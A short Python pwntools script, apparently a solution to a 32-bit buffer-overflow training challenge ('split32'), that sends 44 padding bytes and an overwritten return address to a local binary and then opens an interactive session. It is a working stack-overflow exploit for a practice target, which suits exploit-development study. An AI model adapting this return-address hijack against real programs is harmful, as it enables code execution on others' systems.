from pwn import *

payload = 'A'*44+p32(0x08048649)

p = process('./split32')

print p.recvuntil('>')
p.sendline(payload)
p.interactive()
